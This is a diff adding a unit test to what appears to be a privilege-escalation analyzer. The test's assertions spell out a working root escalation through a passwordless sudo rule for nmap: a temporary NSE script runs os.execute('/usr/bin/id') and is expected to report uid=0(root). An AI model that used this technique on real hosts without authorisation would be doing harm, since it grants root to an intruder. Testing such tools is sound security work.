@@ -68,6 +68,27 @@ def test_sudo_ranked_before_suid():
     assert [item["vector"] for item in candidates] == ["sudo", "suid"]
 
 
+def test_sudo_nmap_yields_the_nse_script_vector():
+    """Theseus: ``(root) NOPASSWD: /usr/bin/nmap`` and no flag that runs code.
+
+    The proof has to be a valid NSE script (``action`` + ``portrule``) or nmap
+    aborts at load with exit 1 after printing the uid line, and the caller
+    -which only accepts exit 0- would read the proof as a failure.
+    """
+    candidates = analyze_privilege_escalation(
+        sudo_rules=["/usr/bin/nmap"], suid=[], capabilities=[]
+    )
+    assert candidates and candidates[0]["binary"] == "nmap"
+    assert candidates[0]["vector"] == "sudo"
+    command = candidates[0]["command"]
+    assert command.startswith("T=$(mktemp); printf")
+    assert "action = function() end" in command
+    assert "portrule = function() return false end" in command
+    assert 'os.execute("/usr/bin/id")' in command
+    assert "sudo /usr/bin/nmap --script=$T -p 1 -n 127.0.0.1" in command
+    assert candidates[0]["proof_expected"] == "uid=0(root)"
+
+
 def test_unmatched_binary_is_ignored():
     candidates = analyze_privilege_escalation(sudo_rules=["/bin/ls"], suid=[], capabilities=[])
     assert candidates == []
